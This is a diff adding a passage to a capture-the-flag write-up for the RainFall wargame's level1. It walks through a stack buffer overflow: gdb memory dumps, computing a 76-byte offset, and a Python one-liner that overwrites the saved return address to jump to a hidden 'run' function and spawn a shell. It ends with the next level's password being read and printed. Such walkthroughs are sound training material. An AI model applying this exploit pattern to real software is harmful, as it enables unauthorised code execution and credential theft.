@@ -60,3 +60,62 @@ Let's see some insites by their addresses:
 		0x8048580:	116 't'	63 '?'	10 '\n'	0 '\000'
 	(gdb) x/16c 0x80497c0
 		0x80497c0 <stdout@@GLIBC_2.0>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
+
+Now we need to find the buffer size.
+
+	Breakpoint 4, 0x08048490 in main ()
+	(gdb) info frame
+	Stack level 0, frame at 0xbffff700:
+		 eip = 0x8048490 in main; saved eip 0xb7e454d3
+		 Arglist at 0xbffff6f8, args:
+		 Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
+		 Saved registers:
+		  ebp at 0xbffff6f8, eip at 0xbffff6fc
+		(gdb) nexti
+	(gdb) x/80x 0xbffff6a0
+		0xbffff6a0:	0xbffff6b0	0x0000002f	0xbffff6fc	0xb7fd0ff4
+		0xbffff6b0:	0x080484a0	0x0804978c	0x00000002	0x08048321
+		0xbffff6c0:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1
+		0xbffff6d0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+		0xbffff6e0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
+		0xbffff6f0:	**0x080484a0**	0x00000000	0x00000000	**0xb7e454d3**
+		0xbffff700:	0x00000002	0xbffff794	0xbffff7a0	0xb7fdc858
+		0xbffff710:	0x00000000	0xbffff71c	0xbffff7a0	0x00000000
+		0xbffff720:	0x08048230	0xb7fd0ff4	0x00000000	0x00000000
+	(gdb) print 0xbffff6f0 - 0xbffff6b0
+		$23 = 64
+
+And till the saved `eip` there are 64 + 4 * 3 = 76 bytes.
+
+Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.
+
+# Exploitation
+
+The function `run` is not called in the binary. But we have buffer that can be overwritten and saved eip address can be changed to the address of the run function. Address of the run function is 0x08048444 = “\x44\x84\x04\x08”:
+
+	(gdb) disass run
+	Dump of assembler code for function run:
+	   **0x08048444** <+0>:	push   ebp
+	   0x08048445 <+1>:	mov    ebp,esp
+	   0x08048447 <+3>:	sub    esp,0x18
+		...
+	   0x0804847e <+58>:	leave
+	   0x0804847f <+59>:	ret
+
+Therefore we use the following injection:
+
+	level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/try
+
+That will help us to break the level.
+
+# Result
+
+	level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/try
+	level1@RainFall:~$ cat /tmp/try - | ./level1
+	Good... Wait what?
+	whoami
+	level2
+	cat /home/user/level2/.pass
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+Why do we use `cat -` command? Because even if we break the level and call shell, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.
